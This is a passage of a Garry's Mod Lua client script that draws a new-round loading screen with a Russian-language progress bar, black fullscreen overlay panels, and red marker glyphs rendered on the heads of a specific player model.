        {p = 0.33, txt = "РАСПРЕДЕЛЕНИЕ РОЛЕЙ..."},
        {p = 0.56, txt = "ВЫДАЧА РОЛЕЙ..."},
        {p = 0.71, txt = "СПАВН ПРЕДМЕТОВ..."},
        {p = 0.89, txt = "ОТПРАВКА СЕТЕВЫХ СООБЩЕНИЙ..."},
        {p = 1.00, txt = "ГОТОВО!"} 
    }

    local function SmoothStep(f)
        return f * f * (3 - 2 * f)
    end

    Pnl.Paint = function(self, w, h)
        local elapsed = SysTime() - startTime
        
        
        local progress = 1
        for i = 1, #waypoints - 1 do
            if elapsed >= waypoints[i].t and elapsed <= waypoints[i+1].t then
                local fraction = (elapsed - waypoints[i].t) / (waypoints[i+1].t - waypoints[i].t)
                progress = Lerp(SmoothStep(fraction), waypoints[i].p, waypoints[i+1].p)
                break
            end
        end

        local currentText = stages[1].txt
        for _, stage in ipairs(stages) do
            if progress >= stage.p then currentText = stage.txt end
        end

        
        surface.SetDrawColor(255, 255, 255, 255)
        if not matImage:IsError() then
            surface.SetMaterial(matImage)
            surface.DrawTexturedRect(0, 0, w, h)
        else
            surface.DrawRect(0, 0, w, h)
        end

        
        surface.SetDrawColor(0, 0, 0, 240)
        surface.SetMaterial(grad_up)
        surface.DrawTexturedRect(0, h - scrh * 0.35, w, scrh * 0.35)

        
        local pulse = math.abs(math.sin(SysTime() * 6))
        
        draw.DrawText("ПОДГОТОВКА НОВОГО РАУНДА", "MM_BigNameB", 40, h/1.08, color_white, TEXT_ALIGN_LEFT)
        
        
        if progress >= 1.0 then
            draw.DrawText(currentText, "MM_Exp", 40, h/1.025, rust_yellow, TEXT_ALIGN_LEFT)
            draw.DrawText("100%", "MM_Exp", w - 40, h/1.025, rust_yellow, TEXT_ALIGN_RIGHT)
        else
            draw.DrawText(currentText, "MM_Exp", 40, h/1.025, ColorAlpha(rust_text_dim, 150 + 105 * pulse), TEXT_ALIGN_LEFT)
            draw.DrawText(math.floor(progress * 100) .. "%", "MM_Exp", w - 40, h/1.025, ColorAlpha(rust_text_dim, 150 + 105 * pulse), TEXT_ALIGN_RIGHT)
        end

        
        local barH = 6
        
        
        surface.SetDrawColor(10, 10, 10, 200)
        surface.DrawRect(0, h - barH, w, barH)

        
        surface.SetDrawColor(rust_yellow.r, rust_yellow.g, rust_yellow.b, 255)
        surface.DrawRect(0, h - barH, w * progress, barH)
        
        
        if progress > 0 and progress < 1 then
            surface.SetDrawColor(255, 255, 255, 200)
            surface.DrawRect((w * progress) - 2, h - barH, 2, barH)
        end
    end

    
    timer.Simple(timeTo100 + holdTime, function()
        if IsValid(Pnl) then
            Pnl:AlphaTo(0, 0.5, 0, function()
                if IsValid(Pnl) then Pnl:Remove() end
            end)
        end
    end)
end)

concommand.Add( "mog_loading", function()
	
	local NotifyPanel = vgui.Create("DNotify")
	NotifyPanel:SetPos(ScrW() / 4086, ScrH() / 4086)
	NotifyPanel:SetSize(ScrW(), ScrH())
	NotifyPanel:SetLife(3)
	NotifyPanel:SetZPos(MainMogFrame:GetZPos())
	timer.Simple(2, function()
		NotifyPanel:SetZPos(NotifyPanel:GetZPos() - 6)
		RunConsoleCommand("camera_reset")
	end)
	

	
	local bg = vgui.Create("DPanel", NotifyPanel)
	bg:Dock(FILL)
	bg:SetBackgroundColor(Color(0, 0, 0))

	
	local lbl = vgui.Create("DLabel", bg)
	lbl:SetPos(ScrW() / 2.5, ScrH() / 2)
	lbl:SetSize(ScrW() / 2, ScrH() / 32)
	lbl:SetText("")
	lbl:SetTextColor(Color(255, 255, 255))
	lbl:SetFont("ImpactSmall")
	lbl:SetWrap(true)

	
	NotifyPanel:AddItem(bg)
end)

function OverHide(time)
	
	OverHidePanel = vgui.Create("DNotify")
	OverHidePanel:SetPos(ScrW() / 4086, ScrH() / 4086)
	OverHidePanel:SetSize(ScrW(), ScrH())
	OverHidePanel:SetLife(time)
	
	

	
	local bg = vgui.Create("DPanel", OverHidePanel)
	bg:Dock(FILL)
	bg:SetBackgroundColor(Color(0, 0, 0))

	
	local lbl = vgui.Create("DLabel", bg)
	lbl:SetPos(ScrW() / 2.5, ScrH() / 2)
	lbl:SetSize(ScrW() / 2, ScrH() / 32)
	lbl:SetText("")
	lbl:SetTextColor(Color(255, 255, 255))
	lbl:SetFont("ImpactSmall")
	lbl:SetWrap(true)

	
	OverHidePanel:AddItem(bg)
end



local TARGET_MODEL = "models/imperator/humans/ar/ar.mdl"
local BONE_NAME = "ValveBiped.Bip01_Head1"

surface.CreateFont("HeadTextFont", {
    font = "Roboto",
    size = 80,
    weight = 800,
    antialias = true
})

hook.Add("PostDrawTranslucentRenderables", "Draw3D2DOnARHead", function(bDepth, bSkybox)
    if bDepth or bSkybox then return end

    for _, ent in ipairs(ents.GetAll()) do
        if IsValid(ent) and string.lower(ent:GetModel() or "") == TARGET_MODEL then
            
            if ent:IsPlayer() or ent:GetClass() == "prop_ragdoll" then
                
                if ent == LocalPlayer() and not LocalPlayer():ShouldDrawLocalPlayer() then continue end

                local boneIndex = ent:LookupBone(BONE_NAME)
                if boneIndex then
                    local pos, ang = ent:GetBonePosition(boneIndex)

                    if pos == ent:GetPos() then
                        local matrix = ent:GetBoneMatrix(boneIndex)
                        if matrix then
                            pos = matrix:GetTranslation()
                            ang = matrix:GetAngles()
                        end
                    end

                    if pos and ang then
                        ang:RotateAroundAxis(ang:Forward(), -25)
                        ang:RotateAroundAxis(ang:Right(), 180)
						ang:RotateAroundAxis(ang:Up(), 90)
                        
                        local offset = ang:Up() * 3.39 + ang:Forward() * -6.5 + ang:Right() * -1
                        pos = pos + offset

                        cam.Start3D2D(pos, ang, 0.05)
                            
                            draw.SimpleText("<", "HeadTextFont", 0, 0, Color(255, 100, 100, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                            
                        cam.End3D2D()

						ang:RotateAroundAxis(ang:Forward(), 90)
                        ang:RotateAroundAxis(ang:Right(), 90)
						ang:RotateAroundAxis(ang:Up(), 90)
                        
                        --offset = ang:Up() * 3.39 + ang:Forward() * -6.5 + ang:Right() * -1
                        --pos = pos + offset

						cam.Start3D2D(pos, ang, 0.05)
                            
                            draw.SimpleText("<", "HeadTextFont", 0, 0, Color(255, 100, 100, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                            
                        cam.End3D2D()
                    end
                end
            end
        end
    end
end)